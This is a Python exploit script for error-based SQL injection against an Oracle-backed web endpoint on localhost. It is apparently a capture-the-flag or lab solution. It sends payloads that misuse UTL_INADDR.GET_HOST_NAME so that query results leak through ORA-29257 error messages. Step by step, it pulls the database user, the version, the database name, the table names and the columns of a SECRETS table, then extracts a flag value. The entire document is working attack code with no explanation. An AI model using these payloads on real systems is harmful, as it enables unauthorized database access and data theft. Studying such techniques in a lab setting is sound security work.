#!/usr/bin/env python3
import requests
import re

BASE_URL = "http://localhost:5014/customer"

def extract_from_error(payload):
    """Extract data from UTL_INADDR error message"""
    r = requests.get(BASE_URL, params={"id": payload})
    match = re.search(r"ORA-29257: host (.+?) unknown", r.text)
    return match.group(1) if match else None

print("[*] Step 1: Get current user")
payload1 = "1 AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))--"
user = extract_from_error(payload1)
print(f"[+] Current User: {user}\n")

print("[*] Step 2: Get database version")
payload2 = "1 AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE ROWNUM=1))--"
version = extract_from_error(payload2)
print(f"[+] Version: {version}\n")

print("[*] Step 3: Get database name")
payload3 = "1 AND 1=UTL_INADDR.GET_HOST_NAME((SELECT name FROM v$database))--"
db_name = extract_from_error(payload3)
print(f"[+] Database Name: {db_name}\n")

print("[*] Step 4: Enumerate tables")
payload4 = "1 AND 1=UTL_INADDR.GET_HOST_NAME((SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM user_tables))--"
tables = extract_from_error(payload4)
print(f"[+] Tables: {tables}\n")

print("[*] Step 5: Get columns from SECRETS table")
payload5 = "1 AND 1=UTL_INADDR.GET_HOST_NAME((SELECT LISTAGG(column_name,',') WITHIN GROUP (ORDER BY column_id) FROM user_tab_columns WHERE table_name='SECRETS'))--"
columns = extract_from_error(payload5)
print(f"[+] Columns in SECRETS: {columns}\n")

print("[*] Step 6: Extract flag")
payload6 = "1 AND 1=UTL_INADDR.GET_HOST_NAME((SELECT value FROM secrets WHERE ROWNUM=1))--"
flag = extract_from_error(payload6)
print(f"[+] Flag: {flag}")

